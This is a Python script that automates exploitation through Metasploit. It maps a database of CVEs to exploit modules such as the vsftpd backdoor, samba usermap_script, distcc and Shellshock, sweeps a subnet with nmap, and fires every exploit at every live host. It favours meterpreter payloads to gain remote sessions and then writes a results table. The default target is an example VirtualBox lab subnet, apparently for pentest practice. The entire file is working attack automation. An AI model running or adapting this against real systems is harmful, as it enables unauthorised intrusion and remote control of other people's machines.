import sqlite3
import nmap
from pymetasploit3.msfrpc import MsfRpcClient
from prettytable import PrettyTable
import ipaddress
import time

# CONFIGURATION
DB_PATH = 'cves.db'  # Path to your CVE database
MSF_PASSWORD = 'msf'  # Metasploit RPC password
MSF_HOST = '127.0.0.1'
MSF_PORT = 55553
SUBNET = '192.168.56.0/24'  # Example VirtualBox Host-Only subnet
REPORT_PATH = 'pentest_report.txt'

# 1. Fetch CVEs from DB
def fetch_cves():
    try:
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute('SELECT cve_id, description FROM cves')
        cves = cur.fetchall()
        conn.close()
        return cves
    except Exception as e:
        print(f"[!] Error fetching CVEs: {e}")
        return []

# # 2. Map CVEs to exploits (improved mapping)
# def map_cve_to_exploit(client, cve_id):
#     try:
#         results = client.modules.search(cve_id)
#         exploits = [m for m in results if m.get('type') == 'exploit']
#         if not exploits:
#             print(f"[!] No exploits found for {cve_id}")
#             return None
#         # Prefer remote exploits
#         for module in exploits:
#             if 'remote' in module.get('fullname', ''):
#                 return module.get('fullname')
#         # Otherwise, return the first exploit
#         return exploits[0].get('fullname')
#     except Exception as e:
#         print(f"[!] Error searching for exploit for {cve_id}: {e}")
#         return None



def map_cve_to_exploit(client, cve_id):
    
    cve_exploit_map = {
        'CVE-2011-2523': 'exploit/unix/ftp/vsftpd_234_backdoor',
        'CVE-2007-2447': 'exploit/linux/samba/samba_usermap_script',
        'CVE-2004-2687': 'exploit/unix/irc/unreal_ircd_3281_backdoor',
        'CVE-2006-2369': 'exploit/unix/misc/distcc_exec',
        'CVE-2009-1151': 'exploit/multi/http/tomcat_mgr_upload',
        'CVE-2010-0738': 'exploit/multi/http/jboss_deploymentfilerepository',
        'CVE-2012-1823': 'exploit/multi/http/php_cgi_arg_injection',
        'CVE-2014-6271': 'exploit/linux/http/apache_mod_cgi_bash_env_exec',
        'CVE-2008-1930': 'exploit/unix/webapp/twiki_debug',
        'CVE-2010-2075': 'exploit/unix/ftp/proftpd_133c_backdoor'
    }
    exploit = cve_exploit_map.get(cve_id)
    if exploit:
        print(f"[+] exploit for {cve_id}: {exploit}")
        return exploit
    try:
        results = client.modules.search(cve_id)
        exploits = [m for m in results if m.get('type') == 'exploit']
        if not exploits:
            print(f"[!] No exploits found for {cve_id}")
            return None
        for module in exploits:
            if 'remote' in module.get('fullname', ''):
                return module.get('fullname')
        return exploits[0].get('fullname')
    except Exception as e:
        print(f"[!] Error searching for exploit for {cve_id}: {e}")
        return None
# 3. Scan subnet for live hosts
def scan_subnet(subnet):
    try:
        nm = nmap.PortScanner()
        nm.scan(hosts=subnet, arguments='-sn')
        hosts = [h for h in nm.all_hosts() if nm[h].state() == 'up']
        return hosts
    except Exception as e:
        print(f"[!] Error scanning subnet: {e}")
        return []

# 4. Run exploit using Metasploit RPC (improved)
def run_exploit(client, exploit, rhost):
    try:
        exploit_mod = client.modules.use('exploit', exploit)
        print(f"[*] Exploit options for {exploit}: {exploit_mod.options}")
        # Only run exploits that support RHOSTS
        if 'RHOSTS' not in exploit_mod.options:
            print(f"[!] Skipping exploit {exploit}: does not support RHOSTS.")
            return False
        exploit_mod['RHOSTS'] = rhost
        # Set RPORT if required and possible
        if 'RPORT' in exploit_mod.options:
            # Try to guess RPORT from exploit name or use common ports
            if 'ftp' in exploit.lower():
                exploit_mod['RPORT'] = 21
            elif 'ssh' in exploit.lower():
                exploit_mod['RPORT'] = 22
            elif 'telnet' in exploit.lower():
                exploit_mod['RPORT'] = 23
            elif 'http' in exploit.lower():
                exploit_mod['RPORT'] = 80
            elif 'smb' in exploit.lower():
                exploit_mod['RPORT'] = 445
            # Add more heuristics as needed

        payloads = exploit_mod.targetpayloads()
        if not payloads:
            print(f"[!] No payloads available for {exploit}")
            return False
        # Prefer meterpreter payloads if available
        meterpreter_payloads = [p for p in payloads if 'meterpreter' in p]
        payload = meterpreter_payloads[0] if meterpreter_payloads else payloads[0]
        print(f"[*] Using payload: {payload}")
        exploit_mod.execute(payload=payload)
        time.sleep(7)  # Wait longer for session creation
        sessions = client.sessions.list
        print(f"[*] Sessions after exploit: {sessions}")
        return len(sessions) > 0
    except Exception as e:
        print(f"[!] Error running exploit {exploit} on {rhost}: {e}")
        return False

# 5. Main pentest logic
def pentest():
    cves = fetch_cves()
    if not cves:
        print("[!] No CVEs found. Exiting.")
        return
    hosts = scan_subnet(SUBNET)
    if not hosts:
        print("[!] No live hosts found. Exiting.")
        return
    try:
        client = MsfRpcClient(MSF_PASSWORD, server=MSF_HOST, port=MSF_PORT)
    except Exception as e:
        print(f"[!] Error connecting to Metasploit RPC: {e}")
        return
    results = []
    print(f"Found {len(cves)} CVEs in database.")
    print(f"Found {len(hosts)} live hosts in subnet.")
    for cve_id, desc in cves:
        exploit = map_cve_to_exploit(client, cve_id)
        if not exploit:
            print(f"No exploit found for {cve_id}")
            continue
        for host in hosts:
            print(f"Running exploit {exploit} for {cve_id} on {host}")
            success = run_exploit(client, exploit, host)
            if success:
                print(f"Exploit {exploit} for {cve_id} on {host} succeeded.")
            else:
                print(f"Exploit {exploit} for {cve_id} on {host} failed.")
            results.append((host, cve_id, exploit, 'Success' if success else 'Fail'))
    generate_report(results)

# 6. Generate report
def generate_report(results):
    table = PrettyTable(['Host', 'CVE', 'Exploit', 'Result'])
    for row in results:
        table.add_row(row)
    with open(REPORT_PATH, 'w') as f:
        f.write(str(table))
    print(f'Report generated at {REPORT_PATH}')

if __name__ == '__main__':
    pentest()